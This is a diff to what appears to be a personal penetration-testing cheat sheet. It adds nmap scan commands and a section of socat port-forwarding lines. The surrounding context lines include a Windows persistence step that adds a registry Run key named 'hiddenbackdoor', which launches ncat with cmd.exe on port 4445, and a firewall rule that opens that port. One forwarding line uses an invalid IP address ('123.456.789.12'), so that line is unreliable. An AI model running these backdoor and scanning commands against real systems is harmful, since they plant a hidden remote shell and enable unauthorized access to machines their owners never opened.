@@ -6,10 +6,13 @@
 ENUM
 ```bash
 #Portscan all Ports
-sudo nmap -sS -p- <ip>
+nmap -sS -p- <ip>
 
 #Portscan with Scripts and Fingerprinting
-sudo nmap -sS -sV -sC -p22,80,9000 <ip>
+nmap -sS -sV -sC -p22,80,9000 <ip>
+
+#nmap full and save out
+nmap -sC -sV -p- -oA nmap/<box> 10.10.10.84
 
 #Web Vuln-Scan
 nikto -host 192.168.56.205
@@ -188,6 +191,23 @@ PERSISTENCE
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v hiddenbackdoor /d "C:\Program Files (x86)\Nmap\ncat.exe -lnp 4445 -e cmd.exe"
 netsh advfirewall firewall add rule name="hiddenbackdoor" dir=in action=allow protocol=TCP localport=4445
 ```
+
+SOCAT STUFF
+```bash
+# socat forwarder
+socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
+
+# socat syslog server
+socat -u udp4-listen:514,bind=192.0.2.10, open:/tmp/syslog,create,append
+
+# forwarding
+socat TCP4-LISTEN:8080 TCP4:123.456.789.12:80
+socat TCP-LISTEN:8088,fork TCP:127.0.0.1:80
+
+# minimal forward proxy
+socat TCP-LISTEN:8443,fork TCP:corethreat.net:443
+```
+
 
 NETCAT STUFF
 ```bash
